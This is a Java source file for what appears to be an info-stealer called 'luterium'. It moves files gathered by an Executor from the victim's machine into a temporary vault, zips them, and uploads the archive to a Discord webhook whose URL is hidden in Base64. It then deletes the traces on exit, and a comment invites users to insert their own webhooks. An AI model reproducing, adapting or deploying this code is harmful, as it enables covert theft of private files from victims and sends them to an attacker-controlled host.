package dev.peter.luterium;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.WebhookClientBuilder;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;

/**
 @author Peter
 @since 08/14/2022
 **/

public class Main {
    public static File vaultPath = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\vault\\");
    public static File vaultZipPath = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofVault.zip");
    public static List<File> fileList;

    public static Executor executor = new Executor(); //Object-oriented programming moment.

    public static List<String> webhooksBase64 =
            Arrays.asList( //Put your Discord webhooks here (in Base64).
                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAwODc4Mzk3NzAzNDgxMzQ5MS9KWWlxeWZzRWpDczl5QlYzN3U4T2FYYkt6LTVhNHdKZXMzX2pZVy0zTmd0cGtTZlU0OHJOWnVvd1ZMMlV2RXl2cnRaMQ==",
                    "",
                    ""
            );
    final static String convertWebhooks = new String(Base64.getDecoder().decode(webhooksBase64.get(new Random().nextInt(1)).getBytes(StandardCharsets.UTF_8)));

    public static WebhookClientBuilder builder = new WebhookClientBuilder(convertWebhooks);
    public static WebhookClient theThing = builder.build(); //This is the webhook basically.

    public static void main(String[] args) throws IOException {
        System.out.println("Hello World!"); //Hi Intellij! Good to see you again! - Peter

        if(!vaultPath.exists()) {
            vaultPath.mkdirs();
        } else {
            vaultPath.delete();
            vaultPath.mkdirs();
        }

        executor.execute(); //Execute the program.

        for(File file : fileList) { //Moves all files to the vault
            Files.move(file.toPath(),
                    (new File(vaultPath + file.getName())).toPath(),
                    StandardCopyOption.REPLACE_EXISTING);
        }

        ZipUtil.pack(vaultPath, vaultZipPath); //Packs the vault to a zip file
        theThing.send(vaultZipPath); //Sends the zip file to the webhook (please check file size, Peter)

        //Deletes everything on exit
        vaultPath.deleteOnExit();
        vaultZipPath.deleteOnExit();
    }
}